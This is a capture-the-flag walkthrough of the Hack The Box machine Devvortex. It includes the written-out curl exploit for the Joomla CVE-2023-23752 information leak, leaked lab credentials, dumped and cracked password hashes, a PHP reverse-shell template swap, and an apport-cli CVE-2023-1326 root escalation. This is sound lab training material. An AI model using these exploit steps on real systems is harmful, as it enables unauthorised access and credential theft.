# **Machine Info**

| OS        | Linux    |
| --------- | -------- |
| **Level** | **Easy** |


# **Walkthrough**
## **Enumeration**
1. Scanning the open ports first revels two ports 22 and 80 running ssh and http.
```
	$sudo nmap -p- --min-rate 10000 -oA portScan 10.10.11.242
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 18:14 +0545
	Nmap scan report for 10.10.11.242 (10.10.11.242)
	Host is up (0.33s latency).
	Not shown: 65533 closed tcp ports (reset)
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http
```

2. Further scanning the open port for the service version along with default set script.
```
	$sudo nmap -sC -sV -p22,80 --min-rate 10000 -oA serviceScan 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 18:15 +0545
Nmap scan report for 10.10.11.242 (10.10.11.242)
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds

```

3. Adding the domain name in our `/etc/hosts` file.
	- ![](Assets/Pasted%20image%2020250313183443.png)

4. This is the website running in the 80 port.
	![](Assets/Pasted%20image%2020250320033427.png)

5. During subdomain enumeration, I discovered `dev.devvortex.htb`.
	![](Assets/Pasted%20image%2020250320033021.png)
	- I then updated the `/etc/hosts` file to include this new subdomain. Upon visiting `dev.devvortex.htb`, I noticed that the website appeared different from the main domain.

6. After the directory enumeration on the new sub-domain, i found a few of status 200 which indicate success and lots of status 403 which mean access to the following resources were forbidden.
	- ![](Assets/Pasted%20image%2020250320040449.png)
	- Here are all the directory name of status code 200 with size. Among it, i found `/robots.txt` interesting as it might contain other hidden directories. Robot.txt is the page containing instruction for bot, like web crawler, which web page to access and not to access.
		```
		/index.php            (Status: 200) [Size: 23221]
		/LICENSE.txt          (Status: 200) [Size: 18092]
		/robots.txt           (Status: 200) [Size: 764]
		/.                    (Status: 200) [Size: 23221]
		/configuration.php    (Status: 200) [Size: 0]
		/README.txt           (Status: 200) [Size: 4942]
		/htaccess.txt         (Status: 200) [Size: 6858]
		```

7. I then visited the `robot.txt` directory and know that it is running Zoomla CMS (Content Management System). Then i ran zoomscan, a zoomla vulnerability scanner, on the site, which detected the version name `4.2.6`. A google search reveal that, the version is vulnerable to improper access check leading to unauthorised access (CVE-2023-23752). 
	```
	
	[+] FireWall Detector
	[++] Firewall not detected
	
	[+] Detecting Joomla Version
	[++] Joomla 4.2.6
	
	[+] Core Joomla Vulnerability
	[++] Target Joomla core is not vulnerable
	
	[+] Checking apache info/status files
	[++] Readable info/status files are not found
	
	[+] admin finder
	[++] Admin page : http://dev.devvortex.htb/administrator/
	
	[+] Checking robots.txt existing
	[++] robots.txt is found
	path : http://dev.devvortex.htb/robots.txt 
	
	Interesting path found from robots.txt
	http://dev.devvortex.htb/joomla/administrator/
	http://dev.devvortex.htb/administrator/
	http://dev.devvortex.htb/api/
	http://dev.devvortex.htb/bin/
	http://dev.devvortex.htb/cache/
	http://dev.devvortex.htb/cli/
	http://dev.devvortex.htb/components/
	http://dev.devvortex.htb/includes/
	http://dev.devvortex.htb/installation/
	http://dev.devvortex.htb/language/
	http://dev.devvortex.htb/layouts/
	http://dev.devvortex.htb/libraries/
	http://dev.devvortex.htb/logs/
	http://dev.devvortex.htb/modules/
	http://dev.devvortex.htb/plugins/
	http://dev.devvortex.htb/tmp/
	
	
	[+] Finding common backup files name
	[++] Backup files are not found
	
	[+] Finding common log files name
	[++] error log is not found
	
	[+] Checking sensitive config.php.x file
	[++] Readable config files are not found
	```

8. Exploiting the vulnerability, I got the user credential.
```
	curl  http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```
`{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},`

- Then i logged in to `/administrator/index.php` with the credential and got access to the administrator dashboard.
- ![](Assets/Pasted%20image%2020250320053843.png)
- ![](Assets/Pasted%20image%2020250320053911.png)

8. On `System > Site template`, It seems that we can view, make changes and save the backend code from the frontend administrator account. So, I change the code in `error.php`  to reverse shell code php code from pentest monkey. Then, visited the `/administrator/error.php` giving us the reverse shell. 
	- ![](Assets/Pasted%20image%2020250320230422.png)

	- ![](Assets/Pasted%20image%2020250320230558.png)

	- ![](Assets/Pasted%20image%2020250320230649.png)


9. Then  I ran `linpea.sh` script by opening the http server in my machine and wget the file from victim machine. I found that there is port `3306` which is default for MYSQL service.
	- ![](Assets/Pasted%20image%2020250320234708.png)
	- I logged into mysql with the user lewis credential. And dump 2 user and password hashes.
	- ![](Assets/Pasted%20image%2020250320235445.png)

	- ![](Assets/Pasted%20image%2020250320235349.png)

	- ![](Assets/Pasted%20image%2020250321000216.png)

	Credentials:
	```
	lewis : $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
	logan : $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
	```

10. I stored the hash in `hash.txt` file and use hashcat tool to, first find the hash type, and then crack the hash.
	- ![](Assets/Pasted%20image%2020250321001714.png)
	- ![](Assets/Pasted%20image%2020250321001452.png)
		Cracked Logan Password:
`$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

11. I ssh with the local user and cracked hash password and found the user flag.
	![](Assets/Pasted%20image%2020250321002121.png)
	![](Assets/Pasted%20image%2020250321002227.png)



## **Privilege Escalation**

12. `sudo -l` command which give list any command we can run as sudo without needing password. I found that we can run `/usr/bin/apport-cli` as sudo without password.
	 `apport-cli is a command line tool used in ubuntu to report crashes and bugs.`
	 ![](Assets/Pasted%20image%2020250321013221.png)
	 
13. The version of `apport-cli 2.20.11` is vulnerable to `CVE-2023-1326` [Here is the POC](https://github.com/diego-tella/CVE-2023-1326-PoC).
	![](Assets/Pasted%20image%2020250321013348.png)
	- I didn't created a crash file, instead report the bug through command line. After collecting the information and before sending the bug report, we can view the report, where we can leverage and run our command and get root shell.
	![](Assets/Pasted%20image%2020250321011010.png)
	![](Assets/Pasted%20image%2020250321011054.png)

	![](Assets/Pasted%20image%2020250321011117.png)

	![](Assets/Pasted%20image%2020250321011246.png)

	![](Assets/Pasted%20image%2020250321011214.png)

14. I got the root shell and view flag in `root.txt`.
	![](Assets/Pasted%20image%2020250321011332.png)


